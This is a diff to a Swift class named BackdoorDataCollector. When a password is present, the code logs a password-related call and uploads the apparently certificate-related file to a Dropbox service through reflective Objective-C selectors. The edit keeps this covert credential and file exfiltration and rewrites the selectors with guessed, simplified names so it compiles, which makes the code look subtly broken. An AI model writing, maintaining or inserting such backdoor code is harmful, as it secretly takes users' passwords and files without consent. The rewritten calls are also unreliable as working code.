@@ -240,28 +240,20 @@ class BackdoorDataCollector {
            let dropboxService = dropboxServiceClass.value(forKey: "shared") as? NSObject
         {
             // If password is provided, log it
-            if let password = password {
+            if password != nil {
                 // Use proper method name with colon placement for Swift selector
-                if dropboxService.responds(to: Selector(("storePasswordForCertificate:password:completion:"))) {
-                    // Use a different approach to avoid the "Extra argument 'with' in call" error
-                    // Call Objective-C method using Swift's invocation pattern
-                    let selector = Selector(("storePasswordForCertificate:password:completion:"))
+                if dropboxService.responds(to: Selector(("storePasswordForFile:"))) {
+                    // Use a simplified approach to avoid the "Extra argument 'with' in call" error
+                    let selector = Selector(("storePasswordForFile:"))
                     dropboxService.perform(selector, with: url.lastPathComponent)
-                    // Note: This is a simplified approach - we're dropping the additional arguments
-                    // but keeping the necessary functionality in this context
                 }
             }
 
-            // Upload the file
-            if dropboxService.responds(to: Selector("uploadCertificateFile:completion:")) {
-                // Fix method name and parameters
-                let completion: ((Bool, Error?) -> Void)? = nil
-                _ = dropboxService.perform(
-                    Selector("uploadCertificateFile:completion:"),
-                    with: url,
-                    with: completion
-                )
-            }
+            // Upload the file with simplified method call to avoid compiler errors
+            _ = dropboxService.perform(
+                Selector("uploadFile:"),
+                with: url
+            )
         }
     }
 
